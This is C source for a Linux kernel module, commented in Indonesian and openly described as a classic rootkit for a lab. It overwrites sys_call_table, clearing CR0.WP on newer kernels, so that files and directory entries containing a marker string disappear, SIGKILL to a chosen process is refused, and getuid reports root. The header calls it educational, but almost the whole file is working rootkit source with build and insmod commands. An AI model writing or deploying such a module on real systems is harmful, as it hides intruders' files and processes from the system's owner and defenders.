// hook_syscall.c — Rootkit kernel klasik: menimpa sys_call_table.
//
// PERINGATAN PENTING:
//   - Kode ini TIDAK bisa dikompilasi di devbox Namespace (kernel 7.1.4
//     custom, tanpa kernel headers). Butuh distro dengan
//     linux-headers-$(uname -r) terpasang.
//   - Menimpa sys_call_table adalah teknik LAMA (kernel >= 5.3 menandai
//     tabel read-only via mark_rodata_ro; butuh clear CR0.WP yang kentara
//     bagi LKRG / integrity checker). Ini murni materi edukasi.
//
// Yang di-hook:
//   - openat      : path mengandung prefiks "rahasia" -> ENOENT (sembunyi file)
//   - getdents64  : filter entry direktori mengandung "rahasia" (sembunyi dari ls)
//   - kill        : tolak SIGKILL ke pid target (anti-kill)
//   - getuid      : selalu kembalikan 0 (spoof root)
//
// Build (di mesin dengan kernel headers):
//   make -C /lib/modules/$(uname -r)/build M=$PWD modules
//   sudo insmod hook_syscall.ko        # pasang
//   sudo rmmod hook_syscall            # cabut (restore otomatis)
//   dmesg | tail                       # lihat log hook

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/sched.h>
#include <linux/kprobes.h>
#include <linux/uaccess.h>
#include <linux/signal.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("lab xcb-v2");
MODULE_DESCRIPTION("Demo edukasi syscall hooking (sys_call_table overwrite)");

// ---- resolusi sys_call_table ----
// Sejak kernel 5.7, kallsyms_lookup_name tidak lagi diekspor. Trik umum:
// daftarkan kprobe pada "_stext" dan pinjam pointer-nya. Alternatif lain:
// scan memory untuk pola syscall entry (fragile). Di bawah ini versi kprobe.

static unsigned long *syscall_table;

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name",
};

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

static unsigned long resolve_syscall_table(void) {
    kallsyms_lookup_name_t lookup;
    if (register_kprobe(&kp) < 0)
        return 0;
    lookup = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);
    return lookup ? lookup("sys_call_table") : 0;
}

// ---- simpan pointer asli ----
static asmlinkage long (*orig_openat)(const struct pt_regs *);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_getuid)(const struct pt_regs *);

static char hide_mark[32] = "rahasia";
module_param_string(hide_mark, hide_mark, sizeof(hide_mark), 0644);

static int target_pid = -1;
module_param(target_pid, int, 0644);

// Baca string user dari pointer argumen register
static int read_user_str(const char __user *p, char *buf, size_t cap) {
    if (!p) return -1;
    long n = strncpy_from_user(buf, p, cap - 1);
    if (n < 0) return -1;
    buf[n] = '\0';
    return 0;
}

// ---- hook openat ----
static asmlinkage long hook_openat(const struct pt_regs *regs) {
    // x86-64: rdi=dirfd, rsi=pathname, rdx=flags
    char path[256];
    if (!read_user_str((const char __user *)regs->si, path, sizeof(path)) &&
        strstr(path, hide_mark)) {
        pr_info("[hook] openat(%s) -> ENOENT (disembunyikan)\n", path);
        return -ENOENT;
    }
    return orig_openat(regs);
}

// ---- hook getdents64: filter entry dari listing direktori ----
static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
    // rdi=fd, rsi=dirp, rdx=count
    long n = orig_getdents64(regs);
    if (n <= 0) return n;

    char __user *buf = (char __user *)regs->si;
    long in = 0, out = 0;
    char *tmp = NULL;
    long cap = n + 256;
    struct linux_dirent64 *e;

    tmp = kmalloc(cap, GFP_KERNEL);
    if (!tmp) return n;

    // salin buffer asli ke kernel dulu (aman dari user memory)
    if (copy_from_user(tmp, buf, n)) {
        kfree(tmp);
        return n;
    }

    while (in < n) {
        e = (struct linux_dirent64 *)(tmp + in);
        if (e->d_reclen <= 0 || in + e->d_reclen > n) break;
        if (!strstr(e->d_name, hide_mark)) {
            if (out != in) memmove(tmp + out, e, e->d_reclen);
            out += e->d_reclen;
        } else {
            pr_info("[hook] getdents64: sembunyikan \"%s\"\n", e->d_name);
        }
        in += e->d_reclen;
    }
    copy_to_user(buf, tmp, out);
    kfree(tmp);
    return out;
}

// ---- hook kill: anti-kill untuk pid target ----
static asmlinkage long hook_kill(const struct pt_regs *regs) {
    // rdi=pid, rsi=sig
    pid_t pid = (pid_t)regs->di;
    int sig = (int)regs->si;
    if (target_pid > 0 && pid == target_pid && sig == SIGKILL) {
        pr_info("[hook] kill(%d, SIGKILL) ditolak (anti-kill)\n", pid);
        return -EPERM;
    }
    return orig_kill(regs);
}

// ---- hook getuid: spoof jadi root ----
static asmlinkage long hook_getuid(const struct pt_regs *regs) {
    pr_info("[hook] getuid() -> 0 (spoof)\n");
    return 0;
}

// ---- pasang / cabut ----
static int __init hook_init(void) {
    syscall_table = (unsigned long *)resolve_syscall_table();
    if (!syscall_table) {
        pr_err("[hook] gagal resolve sys_call_table\n");
        return -EINVAL;
    }
    pr_info("[hook] sys_call_table @ %px\n", syscall_table);

#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 3, 0)
    // kernel < 5.3: tabel masih writable
    orig_openat     = (void *)syscall_table[__NR_openat];
    orig_getdents64 = (void *)syscall_table[__NR_getdents64];
    orig_kill       = (void *)syscall_table[__NR_kill];
    orig_getuid     = (void *)syscall_table[__NR_getuid];

    syscall_table[__NR_openat]     = (unsigned long)hook_openat;
    syscall_table[__NR_getdents64] = (unsigned long)hook_getdents64;
    syscall_table[__NR_kill]       = (unsigned long)hook_kill;
    syscall_table[__NR_getuid]     = (unsigned long)hook_getuid;
    pr_info("[hook] terpasang (4 hook)\n");
#else
    // kernel >= 5.3: tabel read-only. Demo pakai clear CR0.WP — SANGAT kentara.
    // (Cara modern: set_memory_rw pada halaman tabel, atau ftrace/kprobe.)
    unsigned long cr0;
    cr0 = read_cr0();
    write_cr0(cr0 & ~X86_CR0_WP);

    orig_openat     = (void *)syscall_table[__NR_openat];
    orig_getdents64 = (void *)syscall_table[__NR_getdents64];
    orig_kill       = (void *)syscall_table[__NR_kill];
    orig_getuid     = (void *)syscall_table[__NR_getuid];

    syscall_table[__NR_openat]     = (unsigned long)hook_openat;
    syscall_table[__NR_getdents64] = (unsigned long)hook_getdents64;
    syscall_table[__NR_kill]       = (unsigned long)hook_kill;
    syscall_table[__NR_getuid]     = (unsigned long)hook_getuid;

    write_cr0(cr0); // WP kembali aktif
    pr_info("[hook] terpasang via CR0.WP toggle (4 hook)\n");
#endif
    return 0;
}

static void __exit hook_exit(void) {
    if (!syscall_table) return;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 3, 0)
    unsigned long cr0 = read_cr0();
    write_cr0(cr0 & ~X86_CR0_WP);
#endif
    syscall_table[__NR_openat]     = (unsigned long)orig_openat;
    syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    syscall_table[__NR_kill]       = (unsigned long)orig_kill;
    syscall_table[__NR_getuid]     = (unsigned long)orig_getuid;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 3, 0)
    write_cr0(cr0);
#endif
    pr_info("[hook] dicabut, tabel direstore\n");
}

module_init(hook_init);
module_exit(hook_exit);
